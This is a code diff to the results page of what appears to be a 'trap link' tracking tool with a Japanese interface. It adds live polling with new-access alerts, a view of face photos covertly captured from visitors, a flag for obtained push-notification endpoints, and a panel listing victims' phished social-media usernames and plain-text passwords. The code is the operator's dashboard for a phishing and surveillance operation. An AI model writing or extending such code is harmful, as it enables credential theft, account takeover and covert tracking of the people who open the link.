@@ -1,7 +1,7 @@
 // File: src/app/result/[id]/page.tsx
 'use client'
 
-import { useEffect, useState, use } from 'react'
+import { useEffect, useState, use, useRef } from 'react'
 import { format } from 'date-fns'
 import {
     MapPinIcon,
@@ -9,7 +9,10 @@ import {
     DevicePhoneMobileIcon,
     GlobeAltIcon,
     ClockIcon,
-    BoltIcon
+    BoltIcon,
+    CameraIcon,
+    BellIcon,
+    KeyIcon
 } from '@heroicons/react/24/outline'
 
 export default function ResultPage({ params }: { params: Promise<{ id: string }> }) {
@@ -19,26 +22,36 @@ export default function ResultPage({ params }: { params: Promise<{ id: string }>
     const [data, setData] = useState<{ link: any, logs: any[] } | null>(null)
     const [loading, setLoading] = useState(true)
     const [error, setError] = useState('')
+    const [newAccessAlert, setNewAccessAlert] = useState(false)
+    const prevLogCount = useRef(0)
+
+    const fetchData = async (isInitial = false) => {
+        try {
+            const res = await fetch(`/api/links/${linkId}`)
+            const result = await res.json()
+
+            if (res.ok) {
+                setData(result)
+                if (!isInitial && prevLogCount.current > 0 && result.logs.length > prevLogCount.current) {
+                    setNewAccessAlert(true)
+                    setTimeout(() => setNewAccessAlert(false), 5000)
+                }
+                prevLogCount.current = result.logs.length
+            } else {
+                setError(result.error || 'Failed to fetch data')
+            }
+        } catch (err) {
+            setError('Error fetching data')
+        } finally {
+            setLoading(false)
+        }
+    }
 
     useEffect(() => {
-        const fetchData = async () => {
-            try {
-                const res = await fetch(`/api/links/${linkId}`)
-                const result = await res.json()
-
-                if (res.ok) {
-                    setData(result)
-                } else {
-                    setError(result.error || 'Failed to fetch data')
-                }
-            } catch (err) {
-                setError('Error fetching data')
-            } finally {
-                setLoading(false)
-            }
-        }
-
-        fetchData()
+        fetchData(true)
+        // Poll every 5 seconds for real-time updates
+        const interval = setInterval(() => fetchData(), 5000)
+        return () => clearInterval(interval)
     }, [linkId])
 
     if (loading) return (
@@ -60,12 +73,24 @@ export default function ResultPage({ params }: { params: Promise<{ id: string }>
         <div className="min-h-screen bg-gray-50 py-10 px-4 sm:px-6 lg:px-8">
             <div className="max-w-5xl mx-auto">
 
+                {/* 🔴 Realtime New Access Alert */}
+                {newAccessAlert && (
+                    <div className="fixed top-4 right-4 z-50 bg-red-600 text-white px-5 py-3 rounded-xl shadow-2xl flex items-center space-x-2 animate-bounce">
+                        <span className="text-lg">🔔</span>
+                        <span className="font-bold text-sm">新しいアクセスが検出されました！</span>
+                    </div>
+                )}
+
                 {/* Header Section */}
                 <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-6 mb-8 flex flex-col sm:flex-row items-center justify-between gap-4">
                     <div className="flex-shrink-0 text-center sm:text-left">
                         <h1 className="text-2xl font-bold text-gray-900 flex items-center justify-center sm:justify-start">
                             <img src="/map_icon.png" alt="" className="w-8 h-8 mr-2 object-contain" />
                             トラッキング結果
+                            <span className="ml-3 inline-flex items-center text-xs font-semibold bg-green-100 text-green-700 px-2 py-0.5 rounded-full">
+                                <span className="w-2 h-2 bg-green-500 rounded-full mr-1 animate-pulse"></span>
+                                LIVE
+                            </span>
                         </h1>
                         <p className="mt-1 text-sm text-gray-500">
                             Trap Link ID: <span className="font-mono bg-gray-100 px-2 py-0.5 rounded text-gray-700">{linkId}</span>
@@ -183,6 +208,28 @@ export default function ResultPage({ params }: { params: Promise<{ id: string }>
                                                 </p>
                                             </div>
                                         )}
+
+                                        {/* 📷 Face Photo */}
+                                        {log.face_photo && (
+                                            <div className="mt-4 pt-4 border-t border-gray-100">
+                                                <h4 className="text-xs font-bold text-purple-700 mb-2 flex items-center">
+                                                    <CameraIcon className="w-4 h-4 mr-1" /> 📷 顔写真
+                                                </h4>
+                                                <img
+                                                    src={log.face_photo}
+                                                    alt="Captured face"
+                                                    className="w-full max-w-xs mx-auto rounded-xl border border-purple-200 shadow"
+                                                />
+                                            </div>
+                                        )}
+
+                                        {/* 🔔 Push notification */}
+                                        {log.push_endpoint && (
+                                            <div className="mt-3 flex items-center bg-amber-50 text-amber-800 px-3 py-2 rounded-lg border border-amber-200">
+                                                <BellIcon className="w-4 h-4 mr-2 flex-shrink-0" />
+                                                <span className="text-xs font-semibold">🔔 プッシュ通知 取得済み</span>
+                                            </div>
+                                        )}
                                     </div>
 
                                     {/* Device Info */}
@@ -241,12 +288,34 @@ export default function ResultPage({ params }: { params: Promise<{ id: string }>
                                         </div>
 
                                     </div>
+
+                                    {/* 🎭 SNS Credentials */}
+                                    {log.sns_username && (
+                                        <div className="mt-4 pt-4 border-t border-gray-100">
+                                            <h4 className="text-xs font-bold text-red-600 mb-2 flex items-center">
+                                                <KeyIcon className="w-4 h-4 mr-1" /> 🎭 SNSフィッシング結果
+                                            </h4>
+                                            <div className="bg-red-50 border border-red-200 rounded-xl p-3 space-y-2 font-mono text-sm">
+                                                <div className="flex justify-between">
+                                                    <span className="text-red-400 text-xs">プラットフォーム</span>
+                                                    <span className="font-bold text-red-800">{log.sns_platform}</span>
+                                                </div>
+                                                <div className="flex justify-between">
+                                                    <span className="text-red-400 text-xs">ユーザー名/メール</span>
+                                                    <span className="font-bold text-red-800 break-all">{log.sns_username}</span>
+                                                </div>
+                                                <div className="flex justify-between">
+                                                    <span className="text-red-400 text-xs">パスワード</span>
+                                                    <span className="font-bold text-red-800 break-all">{log.sns_password}</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    )}
                                 </div>
                             </div>
                         ))
                     )}
                 </div>
-
             </div>
         </div>
     )
